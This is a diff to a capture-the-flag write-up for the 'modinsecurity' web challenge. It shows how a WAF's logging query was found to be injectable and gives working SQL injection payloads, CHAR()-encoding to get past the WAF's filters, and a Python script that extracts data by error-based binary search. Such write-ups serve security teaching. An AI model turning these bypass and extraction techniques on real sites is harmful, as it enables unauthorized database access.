@@ -66,31 +66,12 @@ x = requests.post(url, data = myobj)
 print(x.text)
 ```
 
-### Hypothesis 1
+After some trial and error, i managed to find a working hypothesis
 
 ```python
-#this triggers the waf
-q = " -- ' or 1=1"
-# this is how the waf MIGHT work:
-# a buggy blacklist of dangerous strings. When triggered, the error page is shown
-# and the offending request is logged.
-# the log query mighy look like this:
-# replace ' with \' in $data (or something equally dumb that is not a prepared statement)
-# insert into logs (data, time) values ($data, 123)
-
-# testing hypothesis
-...
-#nope nothing works as expected
-```
-
-this first hypothesis failed, i couldn't get any result different than the
-red waf page.
-
-### Hypothesis 2
-
-```python
-#The backend could work as described in the first hypothesis, but 
 # only specific form fields are logged when they are detected as dangerous
+# when a string is logged, ' is replaced with \'
+# could be something like
 # INSERT INTO log '$query', 'asd'
 
 # WORKS! this triggers the waf AND a real mysql error.
@@ -114,8 +95,6 @@ q="\\',12) -- ' or 1=1 "
 #INSERT INTO logs (asd, asdsd) VALUES (213, '\\',12) -- ' or 1=1 ')
 ```
 
-The second hypothesis instead turned out to be correct:
-
 The waf has a blacklist of dangerous words, that is tested against each form input.
 When an input matches the blacklist (it can be something as simple as ` --' or 1`)
 The error page is returned, and the offending query is logged.
@@ -132,14 +111,14 @@ INSERT INTO logs (col1, col2) VALUES (timestampprobably, '$data')
 where $data is replaced with the actual forminput data, without a prepared statement.
 We have our sql injection.
 
-> Fun fact, not really relevant: inserting a semicolumn in the query payload
+> Fun fact, not really relevant: inserting a semicolon in the query payload
 > caused an interesting runtime error: 
 >` bad result: failed to send query: cannot send query in the current context: 2: nil: nil.`
 > A quick google search reveals the
 >  [lua library](https://github.com/openresty/lua-resty-mysql/blob/master/lib/resty/mysql.lua)
 >  used to write the challenge,
 > and a quick glance at the [code](https://github.com/openresty/lua-resty-mysql/blob/908521368e95a302d06430ed1772e3fdd1e86216/lib/resty/mysql.lua#L1267) shows that the error cannot be exploited, it's just
-> an issue with multi query statements. But it confirms that modinsecurity
+> an issue with multi query statements. But this confirms that modinsecurity
 > is indeed a nginx plugin
 
 ## Exploiting the sql injection
@@ -161,3 +140,79 @@ a="(select CHAR(45) from information_schema.tables limit 70,1)"
 q= f"asd\\' LIKE {a} ) -- ' or 1=1 "
 #returns error 1048 if the query defined in 'a' didn't return any row
 ```
+
+With this confirmed working, finding the flag is just a matter of writing
+some sql queries and some boilerplate code that will help us with the binary search.
+
+Let's start from the boilerplate code:
+
+```python
+
+def S(string):
+    """ turns a string into a quoteless string that bypasses waf rules """
+    return "CONCAT("+charify(string)+")"
+
+def charify(string):
+  string_without_first_char = string[1:]
+  first_char = string[0]
+  result = "CHAR({})".format(ord(first_char))
+  for c in string_without_first_char:
+    result += ",CHAR({})".format(ord(c))
+  return result
+
+def exec(query):
+    """ Execute a sql query
+    return the sql error, or 0 if none was generated
+    1048: cant be null
+    1064: syntax error
+    0:    no sql error returned
+    """
+    url = 'http://modinsecurity.cyberchallenge.it/'
+    myobj = {'name': '', 'email': '', 'phone': query, 'message': ''}
+    x = requests.post(url, data = myobj)
+    if "MySQL Error" in x.text:
+        errline = x.text.split("\n")[0]
+        errCode = errline.split(" ")[-1][0:4]
+        return errCode
+    return "0"
+
+def binsearch(binTest):
+    """ Decorator function, that facilitates binary serch queries 
+    @argument: a function(char givenChar, int givenPosition) that must execute
+               a query and return true if the char at the given position 
+               is < of the given char
+    @returns: a function(int startIndex=0) that will execute a binary search,
+              printing the result in real time
+    """
+    def retFunc(startIndex=0):
+        def binWalk(i):
+            span = []
+            for c in range(ord(','), ord('}')+1):
+                span.append(chr(c))
+            while len(span) >= 2:
+                middle = len(span)//2
+                if binTest(span[middle], i):
+                    span = span[:middle]
+                else:
+                    span = span[middle:]
+            return span[0]
+
+        res = ""
+        retCommaCount = 0
+        i = startIndex
+        while retCommaCount < 5:
+            i += 1
+            print("searching letter ant index ", i)
+            resC = binWalk(i)
+            if resC == ",":
+                retCommaCount += 1
+            else:
+                retCommaCount = 0
+            res  += resC
+            print("==found== ",res)
+    return retFunc
+
+```
+
+Yes, this is a lot of boilerplate code, and yes this is painful to read.
+But it's stuff i wrote long ago, and hey it works
